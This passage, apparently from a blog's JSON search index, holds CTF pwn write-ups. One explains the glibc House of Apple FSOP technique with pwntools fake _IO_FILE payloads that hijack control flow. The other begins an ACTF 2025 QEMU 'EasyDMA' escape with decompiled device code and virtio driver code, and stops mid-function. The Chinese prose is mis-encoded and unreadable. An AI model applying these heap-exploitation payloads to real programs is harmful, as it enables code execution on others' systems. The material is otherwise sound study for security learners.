ef_on:\n\t      onfct = f-&gt;func.on.fn;\n\t      arg = f-&gt;func.on.arg;\n\t      PTR_DEMANGLE (onfct);\n\n\t      /* Unlock the list while we call a foreign function.  */\n\t      __libc_lock_unlock (__exit_funcs_lock);\n\t      onfct (status, arg);\n\t      __libc_lock_lock (__exit_funcs_lock);\n\t      break;\n\t    case ef_at:\n\t      atfct = f-&gt;func.at;\n\t      PTR_DEMANGLE (atfct);\n\n\t      /* Unlock the list while we call a foreign function.  */\n\t      __libc_lock_unlock (__exit_funcs_lock);\n\t      atfct ();\n\t      __libc_lock_lock (__exit_funcs_lock);\n\t      break;\n\t    case ef_cxa:\n\t      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),\n\t\t we must mark this function as ef_free.  */\n\t      f-&gt;flavor = ef_free;\n\t      cxafct = f-&gt;func.cxa.fn;\n\t      arg = f-&gt;func.cxa.arg;\n\t      PTR_DEMANGLE (cxafct);\n\n\t      /* Unlock the list while we call a foreign function.  */\n\t      __libc_lock_unlock (__exit_funcs_lock);\n\t      cxafct (arg, status);\n\t      __libc_lock_lock (__exit_funcs_lock);\n\t      break;\n\t    }\n\n\t  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))\n\t    /* The last exit function, or another thread, has registered\n\t       more exit functions.  Start the loop over.  */\n\t    goto restart;\n\t}\n\n      *listp = cur-&gt;next;\n      if (*listp != NULL)\n\t/* Don't free the last element in the chain, this is the statically\n\t   allocate element.  */\n\tfree (cur);\n    }\n\n  __libc_lock_unlock (__exit_funcs_lock);\n\n  if (run_list_atexit)\n    call_function_static_weak (_IO_cleanup);\n\n  _exit (status);\n}\n\n\nvoid\nexit (int status)\n{\n  __run_exit_handlers (status, &amp;__exit_funcs, true, true);\n}\nlibc_hidden_def (exit)\n\n_IO_cleanup()\nåœ¨__run_exit_handlers ä¸­è°ƒç”¨äº†_IO_cleanupï¼Œå®ƒåœ¨ /libio/genops.c ä¸­æœ‰å®šä¹‰:\nint\n_IO_cleanup (void)\n{\n  int result = _IO_flush_all ();\n\n  /* We currently don't have a reliable mechanism for making sure that\n     C++ static destructors are executed in the correct order.\n     So it is possible that other static destructors might want to\n     write to cout - and they're supposed to be able to do so.\n\n     The following will make the standard streambufs be unbuffered,\n     which forces any output from late destructors to be written out. */\n  _IO_unbuffer_all ();\n\n  return result;\n}\n_IO_flush_all()\nåŒæ ·åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°_IO_flush_all:\nint\n_IO_flush_all (void)\n{\n  int result = 0;\n  FILE *fp;\n\n#ifdef _IO_MTSAFE_IO\n  _IO_cleanup_region_start_noarg (flush_cleanup);\n  _IO_lock_lock (list_all_lock);\n#endif\n\n  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)\n    {\n      run_fp = fp;\n      _IO_flockfile (fp);\n\n      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n       || (_IO_vtable_offset (fp) == 0\n           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n       )\n      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n    result = EOF;\n\n      _IO_funlockfile (fp);\n      run_fp = NULL;\n    }\n\n#ifdef _IO_MTSAFE_IO\n  _IO_lock_unlock (list_all_lock);\n  _IO_cleanup_region_end (0);\n#endif\n\n  return result;\n}\nvoid\n_cthreads_flockfile (FILE *fp)\n{\n  _IO_lock_lock (*fp-&gt;_lock);\n}\n\n// ...\n\nvoid _IO_flockfile (FILE *)\n     __attribute__ ((alias (\"_cthreads_flockfile\")));\n\n// ...\n_IO_FILE_plus åœ¨ /libio/stdfiles.c æœ‰å®šä¹‰\nä¸»è¦å…³æ³¨è¿™ä¸ªå‡½æ•°ä¸­çš„åˆ¤æ–­æ¡ä»¶ï¼Œå¦‚æœå‰é¢çš„æ¡ä»¶æ»¡è¶³ï¼Œä¼šè¿›å…¥_IO_OVERFLOW (fp, EOF)ï¼Œè¿™æ˜¯ä¸€ä¸ªå®å®šä¹‰ï¼Œä½äº /libio/libioP.hï¼š\n/* Type of MEMBER in struct type TYPE.  */\n#define _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)\n\n/* Essentially ((TYPE *) THIS)-&gt;MEMBER, but avoiding the aliasing\n   violation in case THIS has a different pointer type.  */\n#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \\\n  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \\\n\t\t\t\t       + offsetof(TYPE, MEMBER)))\n//...\n#define _IO_JUMPS_FILE_plus(THIS) \\\n  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)\n//...\n# define _IO_JUMPS_FUNC(THIS) \\\n  (IO_validate_vtable                                                   \\\n   (*(struct _IO_jump_t **) ((void  +*) &amp;_IO_JUMPS_FILE_plus (THIS)\t\\\n\t\t\t     + (THIS)-&gt;_vtable_offset)))\t\n//...\n#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)\n//...\n#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)\n//...\nIO_validate_vtable (const struct _IO_jump_t *vtable)\n{\n  uintptr_t ptr = (uintptr_t) vtable;\n  uintptr_t offset = ptr - (uintptr_t) &amp;__io_vtables;\n  if (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))\n    /* The vtable pointer is not in the expected section.  Use the\n       slow path, which will terminate the process if necessary.  */\n    _IO_vtable_check ();\n  return vtable;\n}\nå¦‚æœé€šè¿‡åˆæ³•æ€§æ£€æŸ¥ï¼Œé‚£ä¹ˆä¼šæ‰§è¡Œ_vtable-&gt;__overflow\n#define JUMP_FIELD(TYPE, NAME) TYPE NAME\n//...\nstruct _IO_jump_t\n{\n//...\n    JUMP_FIELD(_IO_overflow_t, __overflow);\n//...\n}\nè¿™é‡Œ__overflow æ˜¯_IO_jump_t vtable ä¸­çš„è™šå‡½æ•°ï¼Œè¿™æ˜¯ GLIBC ä¸­å®ç° I/O å¤šæ€çš„æ ¸å¿ƒæœºåˆ¶\nvtable2\né€šè¿‡è™šå‡½æ•°è¡¨ï¼ˆvtableï¼‰ä¸ºä¸åŒç±»å‹çš„æ–‡ä»¶æµï¼ˆå¦‚æ–‡ä»¶ã€å†…å­˜æµã€å­—ç¬¦ä¸²æµï¼‰æä¾›ç»Ÿä¸€çš„æ¥å£ï¼ŒåŒæ—¶å…è®¸ä¸åŒæµç±»å‹è‡ªå®šä¹‰åº•å±‚æ“ä½œï¼ˆå¦‚è¯»ã€å†™ã€ç¼“å†²åŒºç®¡ç†ï¼‰ã€‚\næˆ‘ä»¬å¯ä»¥åœ¨ /libio/vtables.c ä¸­æ‰¾åˆ°ç›¸å…³çš„å®šä¹‰ã€‚\nconst struct _IO_jump_t __io_vtables[] attribute_relro =\n{\n  /* _IO_str_jumps  */\n  [IO_STR_JUMPS] =\n  {\n\tJUMP_INIT_DUMMY,\n    JUMP_INIT (finish, _IO_str_finish),\n  //...\n  },\n  [IO_WSTR_JUMPS] = {\n\tJUMP_INIT_DUMMY,\n    JUMP_INIT (finish, _IO_wstr_finish),\n  //...\n  },\n  //...\n}\nä¹Ÿå°±æ˜¯è¯´ï¼Œ__overflow\nå®é™…æ˜¯æ‰§è¡Œ__io_vtables ä¸­å·²å®šä¹‰çš„ç›¸å…³å‡½æ•°ã€‚å¦‚ finishï¼Œä¼šæ ¹æ®ä¸åŒ I/O ç±»å‹æ‰§è¡Œä¸åŒå‡½æ•°ï¼Œä¾‹å¦‚ [IO_STR_JUMPS] ä¸­æŒ‡å‘_IO_str-finishï¼›[IO_WSTR_JUMPS] ä¸­æŒ‡å‘_IO_wstr_finishã€‚\nIII. House of Apple\nåœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨_IO_JUMPS_FUNC(THIS) è¿™ä¸ªå®ä¸­éªŒè¯äº† const struct _IO_jump_t *vtable æ˜¯å¦æ˜¯åˆæ³•çš„ï¼šå³å®ƒæŒ‡å‘çš„åœ°å€æ˜¯å¦åœ¨__io_vtables çš„èŒƒå›´å†…ã€‚è¿™ä¹Ÿè®©æˆ‘ä»¬ä¸èƒ½é€šè¿‡ç›´æ¥ä¼ªé€  vtable æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚\nç„¶è€Œï¼Œæˆ‘ä»¬ä»æœ‰æœºä¼šä¿®æ”¹ vtable ä¸ºä¸åŒçš„åˆæ³•è™šè¡¨ã€‚è¿™å¯¼è‡´äº†åç»­å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„æ¼æ´ã€‚\næ„é€ _IO_FILE_plus\nä½¿ç”¨ House of Apple çš„å‰ææ˜¯ Large bin\nattackï¼Œå®ƒå°†ä¸€ä¸ªå †åœ°å€å†™åœ¨ä»»æ„åœ°å€å¤„ã€‚\nè¿™é‡Œå°† &amp;_IO_list_all å¤„å†™å¯æ§å †åœ°å€ï¼Œç„¶åå¼€å§‹ä¼ªé€ _IO_FILE_plusã€‚\nç”±äº Large bin\nattack æ˜¯æŠŠå †çš„å¤´éƒ¨ prev_size åœ°å€å†™å…¥ï¼Œè€Œä¸€èˆ¬æˆ‘ä»¬åªèƒ½ä» fd åŸŸå¼€å§‹ç¼–è¾‘ï¼Œæ‰€ä»¥ä¸‹æ–‡çš„ä¼ªé€ ä¼šä» fd å¼€å§‹ã€‚\nfake_io = flat({\n\t0x18:[\n\t\tp64(1) # _IO_write_ptr [fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base]\n\t],\n\t0x60:[\n\t\tp32(0) # _fileno\n\t],\n\t0x78:[\n\t\tp64(_IO_stdfile_2_lock) # *_lock [_IO_flockfile (fp);]\n\t],\n\t0xb0:[\n\t\tp32(0xFFFFFFFF) # _mode [fp-&gt;_mode &lt;= 0]\n\t]\n})\n_wide_data è°ƒç”¨é“¾\nå°½ç®¡æ— æ³•ç›´æ¥é€šè¿‡ä¿®æ”¹ vtable æ§åˆ¶æ‰§è¡Œæµï¼Œä½†æ˜¯_wide_data-&gt;_wide_vtable åœ¨æ‰§è¡Œæ—¶ç¼ºå°‘å®‰å…¨æ£€æŸ¥ã€‚\nå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹è°ƒç”¨é“¾ï¼Œå…¶ä¸­æ¶‰åŠåˆ°çš„æ–¹æ³•å’Œå®å¯è‡ªè¡ŒæŸ¥é˜…ï¼š\n_IO_OVERFLOW (fp, EOF)-&gt;\n(_IO_overflow_t) _IO_wfile_overflow-&gt;\n_IO_wdoallocbuf (f)-&gt;\n_IO_WDOALLOCATE (fp)-&gt;\nBackdoor(fp) # fake vtable points at\næ„é€ _wide_data,\n_wide_vtable\nä¸ºäº†ä½¿ç”¨ä¸Šé¢çš„è°ƒç”¨é“¾ï¼Œéœ€è¦ä¿®æ”¹ *_wide_data åˆ°æˆ‘ä»¬ä¼ªé€ çš„_IO_wide_dataã€‚\nè¿™é‡Œæœ‰ä¸€ä¸ªå·§å¦™çš„å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶æŒ‡å‘ä¹‹å‰ä¼ªé€ çš„_IO_FILE_plus å¤„ï¼Œå› ä¸º_IO_wide_data ä¸­éƒ¨åˆ†æˆå‘˜æ˜¯ä¸_IO_FILE ç›¸åŒçš„ã€‚\nç„¶ååœ¨_wide_data-&gt;_wide_vtable å¤„å†™æ„é€ çš„ vtable åœ°å€ã€‚\n\n\n\nimage-20250408193602020\n\n_IO_stdfile_2_lock = libc_base + 0x205700 # find your offset in gdb\nIO_file_addr = heap_base + 0x0d00\nIO_wide_data_addr = IO_file_addr\nwide_vtable_addr = file_addr + 0xe8-0x68 \n\nfake_io = flat({\n\t0x18:[\n\t\tp64(1) # _IO_write_ptr [fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base]\n\t],\n\t0x60:[\n\t\tp32(0) # _fileno\n\t],\n\t0x78:[\n\t\tp64(_IO_stdfile_2_lock) # *_lock [_IO_flockfile (fp);]\n\t],\n\t0x90:[\n\t\tp64(IO_wide_data_addr) # *_wide_data\n\t],\n\t0xb0:[\n\t\tp32(0xFFFFFFFF) # _mode [fp-&gt;_mode &lt;= 0]\n\t],\n\t0xc8:[\n\t\tp64(libc_base+libc.sym['_IO_wfile_jumps']) # vtable\n\t],\n\t0xd0:[\n\t\tp64(wide_vtable_addr)\n\t],\n\t0xd8:[\n\t\tp64(gadget)\n\t]\n})\nè¿™æ ·ï¼Œå°±æ§åˆ¶äº†ç¨‹åºæ‰§è¡Œæµï¼Œå¹¶ä¸” $rdi = &amp;fpã€‚\nå¯¹äº House of Apple çš„å®è·µï¼Œæ‚¨ä¹Ÿå¯ä»¥é˜…è¯»æˆ‘çš„è¿™ç¯‡æ–‡ç« ï¼šHGAME\n2025 Week 2 Writeup\nReferences\n\n\n\nçœ‹é›ªï¼šHouse of apple\nä¸€ç§æ–°çš„ glibc ä¸­ IO æ”»å‡»æ–¹æ³•â†©ï¸\nçœ‹é›ªï¼šPwn å †åˆ©ç”¨å­¦ä¹  â€”â€”\nFSOPã€House of Orangeâ†©ï¸\n\n\n","categories":["CTF"],"tags":["pwn","FSOP","House of Apple"]},{"title":"QEMU PWN - EasyDMA","url":"/categories/CTF/easydma/","content":"EasyDMA\nFrom: ACTF 2025\né¢˜ç›®ç»™å‡ºä¸€ä¸ªå»ç¬¦å·çš„ qemu äºŒè¿›åˆ¶æ–‡ä»¶\nqemu-system-x86_64ï¼Œå¯åŠ¨å‚æ•°å¦‚ä¸‹\n#!/bin/sh\ntimeout --foreground 300 ./qemu-system-x86_64 \\\n    -L pc-bios \\\n    -m 1024 \\\n    -kernel bzImage \\\n    -initrd rootfs.cpio \\\n    -drive file=null-co://,if=none,id=mydisk \\\n    -device virtio-blk-pci,drive=mydisk,ioeventfd=off \\\n    -device readflag \\\n    -append \"priority=low console=ttyS0\" \\\n    -monitor /dev/null \\\n    -nographic\n\næ·»åŠ ä¸¤ä¸ªè®¾å¤‡ virtio-blk-pci, readflagã€‚\nåæ±‡ç¼–å¯ä»¥æ‰¾åˆ° readflag é€šè¿‡ mmio çš„è¯»ã€å†™å›è°ƒå‡½æ•°ï¼š\n__int64 __fastcall readflag_mmio_read(__int64 opaque, unsigned __int64 addr, int size)\n{\n  __int64 result; // rax\n\n  if ( addr &gt; 0x7F )\n  {\n    result = -1LL;\n    if ( size != 4 )\n      return result;\n  }\n  else if ( size != 4 )\n  {\n    result = -1LL;\n    if ( size != 8 )\n      return result;\n  }\n  result = 0xDEADBEEFLL;\n  if ( addr )\n  {\n    if ( addr == 8 )\n      return *(_QWORD *)(opaque + 2984);\n    else\n      return -1LL;\n  }\n  return result;\n}\nvoid __fastcall readflag_mmio_write(__int64 opaque, unsigned __int64 addr, size_t val, int size)\n{\n  void *v4; // rbp\n  FILE *v5; // rax\n  FILE *v6; // r12\n  size_t v7; // rax\n  int v8; // [rsp+0h] [rbp-20h]\n\n  if ( addr &gt; 0x7F )\n  {\n    if ( size != 4 )\n      return;\n  }\n  else if ( size != 4 )\n  {\n    if ( size == 8 &amp;&amp; addr == 8 )\n      goto LABEL_6;\n    return;\n  }\n  if ( addr )\n  {\n    if ( addr == 8 )\nLABEL_6:\n      *(_QWORD *)(opaque + 2984) = val;\n  }\n  else if ( val &lt;= 0xFFF )\n  {\n    v8 = val;\n    v4 = malloc(val);\n    if ( v4 )\n    {\n      v5 = fopen64(\"flag\", \"r\");\n      v6 = v5;\n      if ( v5 )\n      {\n        v7 = fread(v4, 1uLL, (unsigned int)(v8 - 1), v5);\n        if ( v7 )\n          *((_BYTE *)v4 + v7) = 0;\n        else\n          puts(\"No data read from the file.\");\n        free(v4);\n        fclose(v6);\n      }\n      else\n      {\n        perror(\"Error opening file\");\n        free(v4);\n      }\n    }\n    else\n    {\n      perror(\"Memory allocation failed\");\n    }\n  }\n}\nVirtio Block Device1\nData types definition\nFor the integer data types used in the structure definitions, the\nfollowing conventions are used:\n\nu8, u16, u32, u64\nAn unsigned integer of the specified length in bits.\nle16, le32, le64\nAn unsigned integer of the specified length in bits, in little-endian\nbyte order.\n\n#define u8 uint8_t\n#define u16 uint16_t\n#define u32 uint32_t\n#define u64 uint64_t\n#define le16 u16\n#define le32 u32\n#define le64 u64\nPCI Capabilities\nstruct virtio_pci_cap {\n    u8 cap_vndrÍ¾ /* Generic PCI field: PCI_CAP_ID_VNDR */\n    u8 cap_nextÍ¾ /* Generic PCI field: next ptr. */\n    u8 cap_lenÍ¾ /* Generic PCI field: capability length */\n    u8 cfg_typeÍ¾ /* Identifies the structure. */\n    u8 barÍ¾ /* Where to find it. */\n    u8 idÍ¾ /* Multiple capabilities of the same type */\n    u8 padding[2]Í¾ /* Pad to full dword. */\n    le32 offsetÍ¾ /* Offset within bar. */\n    le32 lengthÍ¾ /* Length of the structure, in bytes. */\n}Í¾\ncfg_type identifies the structure,\naccording to the following table:\n/* Common configuration */\n#define VIRTIO_PCI_CAP_COMMON_CFG 1\n/* Notifications */\n#define VIRTIO_PCI_CAP_NOTIFY_CFG 2\n/* ISR Status */\n#define VIRTIO_PCI_CAP_ISR_CFG 3\n/* Device specific configuration */\n#define VIRTIO_PCI_CAP_DEVICE_CFG 4\n/* PCI configuration access */\n#define VIRTIO_PCI_CAP_PCI_CFG 5\n/* Shared memory region */\n#define VIRTIO_PCI_CAP_SHARED_MEMORY_CFG 8\n/* Vendor-specific data */\n#define VIRTIO_PCI_CAP_VENDOR_CFG 9\nFor common configuration, its layout is\nbelow:\nstruct virtio_pci_common_cfg {\n    /* About the whole device. */\n    le32 device_feature_selectÍ¾ /* read-write */\n    le32 device_featureÍ¾ /* read-only for driver */\n    le32 driver_feature_selectÍ¾ /* read-write */\n    le32 driver_featureÍ¾ /* read-write */\n    le16 config_msix_vectorÍ¾ /* read-write */\n    le16 num_queuesÍ¾ /* read-only for driver */\n    u8 device_statusÍ¾ /* read-write */\n    u8 config_generationÍ¾ /* read-only for driver */\n    /* About a specific virtqueue. */\n    le16 queue_selectÍ¾ /* read-write */\n    le16 queue_sizeÍ¾ /* read-write */\n    le16 queue_msix_vectorÍ¾ /* read-write */\n    le16 queue_enableÍ¾ /* read-write */\n    le16 queue_notify_offÍ¾ /* read-only for driver */\n    le64 queue_descÍ¾ /* read-write */\n    le64 queue_driverÍ¾ /* read-write */\n    le64 queue_deviceÍ¾ /* read-write */\n    le16 queue_notif_config_dataÍ¾ /* read-only for driver */\n    le16 queue_resetÍ¾ /* read-write */\n    /* About the administration virtqueue. */\n    le16 admin_queue_indexÍ¾ /* read-only for driver */\n    le16 admin_queue_numÍ¾ /* read-only for driver */\n}Í¾\nFor notification, its layout is below:\nstruct virtio_pci_notify_cap {\n    struct virtio_pci_cap capÍ¾\n    le32 notify_off_multiplierÍ¾ /* Multiplier for queue_notify_off. */\n}Í¾\n\nWe recognize these type, and record the offset.\nvoid print_cap(struct virtio_pci_cap* cap){\n    printf(\"cap_len: %x\\n\", cap-&gt;cap_len);\n    switch(cap-&gt;cfg_type){\n        case VIRTIO_PCI_CAP_COMMON_CFG:\n            printf(\"cfg_type: common\\n\");\n            break;\n        case VIRTIO_PCI_CAP_NOTIFY_CFG:\n            printf(\"cfg_type: notify\\n\");\n            break;\n        case VIRTIO_PCI_CAP_ISR_CFG:\n            printf(\"cfg_type: isr\\n\");\n            break;\n        case VIRTIO_PCI_CAP_DEVICE_CFG:\n            printf(\"cfg_type: device\\n\");\n            break;\n        case VIRTIO_PCI_CAP_PCI_CFG:\n            printf(\"cfg_type: pci\\n\");\n            break;\n        case VIRTIO_PCI_CAP_SHARED_MEMORY:\n            printf(\"cfg_type: shared memory\\n\");\n            break;\n        case VIRTIO_PCI_CAP_VENDOR_CFG:\n            printf(\"cfg_type: vendor\\n\");\n            break;\n        default:\n            printf(\"cfg_type: unknown\\n\");\n            break;\n    }\n    printf(\"bar: %x\\n\", cap-&gt;bar);\n    printf(\"id: %x\\n\", cap-&gt;id);\n    printf(\"offset: %x\\n\", cap-&gt;offset);\n    printf(\"length: %x\\n\", cap-&gt;length);\n}\n\nswitch(cap.cfg_type){\n            case VIRTIO_PCI_CAP_COMMON_CFG:\n                virtio_common_mmio = virtio_mmio + cap.offset;\n                break;\n            case VIRTIO_PCI_CAP_NOTIFY_CFG:\n                virtio_notify_mmio = (struct virtio_notify_cfg*)((size_t)virtio_mmio + cap.offset);\n                break;\n            case VIRTIO_PCI_CAP_ISR_CFG:\n                virtio_isr_mmio = virtio_mmio + cap.offset;\n                break;\n            case VIRTIO_PCI_CAP_DEVICE_CFG:\n                virtio_device_mmio = virtio_mmio + cap.offset;\n                break;\n            default:\n                break;\n        }\nVirtqueue2\nThe mechanism for bulk data transport on virtio devices is\npretentiously called a virtqueue. Each device can have zero or more\nvirtqueues.\nEach virtqueue can consist of up to 3 parts:\nâ€‹ â€¢ Descriptor Area - used for describing buffers\nâ€‹ â€¢ Driver Area - extra data supplied by driver to the device. Also\ncalled avail virtqueue.\nâ€‹ â€¢ Device Area - extra data supplied by device to driver. Also called\nused virtqueue.\n\n\nShared memory with split ring\nelements\n\nThere areas structure defined below:\nstruct virtq_desc {\n    /* Address (guest-physical). */\n    le64 addr;\n    /* Length. */\n    le32 len;\n/* This marks a buffer as continuing via the next field. */\n#define VIRTQ_DESC_F_NEXT 1\n/* This marks a buffer as device write-only (otherwise device read-only). */\n#define VIRTQ_DESC_F_WRITE 2\n/* This means the buffer contains a list of buffer descriptors. */\n#define VIRTQ_DESC_F_INDIRECT 4\n    /* The flags as indicated above. */\n    le16 flags;\n    /* Next field if flags &amp; NEXT */\n    le16 next;\n};\n\nstruct virtq_avail {\n#define VIRTQ_AVAIL_F_NO_INTERRUPT 1\n    le16 flags;\n    le16 idx;\n    le16 ring[VIRTIO_QUEUE_SIZE];\n    le16 used_event; /* Only if VIRTIO_F_EVENT_IDX */\n};\n\nstruct virtq_used_elem {\n    /* Index of start of used descriptor chain. */\n    le32 id;\n\n    /*\n    * The number of bytes written into the device writable portion of\n    * the buffer described by the descriptor chain.\n    */\n    le32 len;\n};\n\nstruct virtq_used {\n#define VIRTQ_USED_F_NO_NOTIFY 1\n    le16 flags;\n    le16 idx;\n    struct virtq_used_elem ring[VIRTIO_QUEUE_SIZE];\n    le16 avail_event; /* Only if VIRTIO_F_EVENT_IDX */\n};\n\nThe driver queues requests to the virtqueue, the type of the request\nis either a read (VIRTIO_BLK_T_IN), a write (VIRTIO_BLK_T_OUT), a\ndiscard (VIRTIO_BLK_T_DISCARD), a write zeroes\n(VIRTIO_BLK_T_WRITE_ZEROES) or a flush (VIRTIO_BLK_T_FLUSH).\nstruct virtio_blk_req { \n        le32 type; \n        le32 reserved; \n        le64 sector; \n        u8 data[][512]; \n        u8 status; \n}; \n \nstruct virtio_blk_discard_write_zeroes { \n       le64 sector; \n       le32 num_sectors; \n       struct { \n               le32 unmap:1; \n               le32 reserved:31; \n       } flags; \n};\n\n#define VIRTIO_BLK_T_IN           0 \n#define VIRTIO_BLK_T_OUT          1 \n#define VIRTIO_BLK_T_FLUSH        4 \n#define VIRTIO_BLK_T_DISCARD      11 \n#define VIRTIO_BLK_T_WRITE_ZEROES 13\nMMIO3\nMemory-mapped I/O (MMIO) uses the\nsame address space to address both main memory and I/O devices. The\nmemory and registers of the I/O devices are mapped to (associated with)\naddress values, so a memory address may refer to either a portion of\nphysical RAM or to memory and registers of the I/O device.\nuint8_t mmio_read8(void* addr){\n    return *(volatile uint8_t*)addr;\n}\n\nuint16_t mmio_read16(void* addr){\n    return *(volatile uint16_t*)addr;\n}\n\nuint32_t mmio_read32(void* addr){\n    return *(volatile uint32_t*)addr;\n}\n\nuint64_t mmio_read64(void* addr){\n    return *(volatile uint64_t*)addr;\n}\n\nvoid mmio_write8(void* addr, uint8_t val){\n    *(volatile uint8_t*)addr = val;\n}\n\nvoid mmio_write16(void* addr, uint16_t val){\n    *(volatile uint16_t*)addr = val;\n}\n\nvoid mmio_write32(void* addr, uint32_t val){\n    *(volatile uint32_t*)addr = val;\n}\n\nvoid mmio_write64(void* addr, uint64_t val){\n    *(volatile uint64_t*)addr = val;\n}\nDevice configuration layout\nstruct virtio_blk_config {\n        le64 capacityÍ¾\n        le32 size_maxÍ¾\n        le32 seg_maxÍ¾\n    struct virtio_blk_geometry {\n        le16 cylindersÍ¾\n        u8 headsÍ¾\n        u8 sectorsÍ¾\n    } geometryÍ¾\n    le32 blk_sizeÍ¾\n    struct virtio_blk_topology {\n        // # of logical blocks per physical block (log2)\n        u8 physical_block_expÍ¾\n        // offset of first aligned logical block\n        u8 alignment_offsetÍ¾\n        // suggested minimum I/O size in blocks\n        le16 min_io_sizeÍ¾\n        // optimal (suggested maximum) I/O size in blocks\n        le32 opt_io_sizeÍ¾\n    } topologyÍ¾\n    u8 writebackÍ¾\n    u8 unused0Í¾\n    u16 num_queuesÍ¾\n    le32 max_discard_sectorsÍ¾\n    le32 max_discard_segÍ¾\n    le32 discard_sector_alignmentÍ¾\n    le32 max_write_zeroes_sectorsÍ¾\n    le32 max_write_zeroes_segÍ¾\n    u8 write_zeroes_may_unmapÍ¾\n    u8 unused1[3]Í¾\n    le32 max_secure_erase_sectorsÍ¾\n    le32 max_secure_erase_segÍ¾\n    le32 secure_erase_sector_alignmentÍ¾\n    struct virtio_blk_zoned_characteristics {\n        le32 zone_sectorsÍ¾\n        le32 max_open_zonesÍ¾\n        le32 max_active_zonesÍ¾\n        le32 max_append_sectorsÍ¾\n        le32 write_granularityÍ¾\n        u8 modelÍ¾\n        u8 unused2[3]Í¾\n    } zonedÍ¾\n}Í¾\nInitialization\n\nRead capabilities\nReset device\nReset Virtqueue\n\nvoid init_virtio() {\n    int fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/config\", O_RDONLY);\n    if(fd &lt; 0){\n        ERR(\"Open virtio config\");\n    }\n    struct virtio_pci_cap cap;\n    char* config = malloc(0x1000);\n    int bytes_read = read(fd, config, 0x1000);\n    if(bytes_read &lt; 0){\n        ERR(\"Read virtio config\");\n    }\n\n    fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource4\", O_RDWR | O_SYNC);\n    if(fd &lt; 0){\n        ERR(\"Open virtio resource4\");\n    }\n    virtio_mmio = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);\n    if(virtio_mmio == (volatile void*)-1){\n        ERR(\"mmap virtio mem\");\n    }\n    close(fd);\n\n    u8 cap_ptr = *(u8*)(config+0x34);\n    while(cap_ptr != 0){\n        if(config[cap_ptr] != 0x9){\n            cap_ptr = *(u8*)(config+cap_ptr+1);\n            continue;\n        }\n        memcpy(&amp;cap, config+cap_ptr, sizeof(cap));\n        print_cap(&amp;cap);\n        switch(cap.cfg_type){\n            case VIRTIO_PCI_CAP_COMMON_CFG:\n                virtio_common_mmio = virtio_mmio + cap.offset;\n                break;\n            case VIRTIO_PCI_CAP_NOTIFY_CFG:\n                virtio_notify_mmio = (struct virtio_notify_cfg*)((size_t)virtio_mmio + cap.offset);\n                break;\n            case VIRTIO_PCI_CAP_ISR_CFG:\n                virtio_isr_mmio = virtio_mmio + cap.offset;\n                break;\n            case VIRTIO_PCI_CAP_DEVICE_CFG:\n                virtio_device_mmio = virtio_mmio + cap.offset;\n                break;\n            default:\n                break;\n        }\n        cap_ptr = cap.cap_next;\n    }\n    close(fd);\n    free(config);\n\n    struct virtio_pci_common_cfg* common_cfg = (struct virtio_pci_common_cfg*)virtio_common_mmio;\n    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 0);\n    printf(\"device_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));\n    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 1);\n    printf(\"device_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));\n    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);\n    printf(\"driver_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));\n    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 1);\n    printf(\"driver_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));\n\n    struct virtio_blk_config* blk_cfg = (struct virtio_blk_config*)virtio_device_mmio;\n    printf(\"capacity: %lx\\n\", mmio_read64(&amp;blk_cfg-&gt;capacity));\n    printf(\"size_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;size_max));\n    printf(\"seg_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;seg_max));\n    printf(\"geometry.cylinders: %x\\n\", mmio_read16(&amp;blk_cfg-&gt;geometry.cylinders));\n    printf(\"geometry.heads: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.heads));\n    printf(\"geometry.sectors: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.sectors));\n    printf(\"blk_size: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;blk_size));\n\n    // reset device\n    mmio_write8(&amp;common_cfg-&gt;device_status, 0);\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    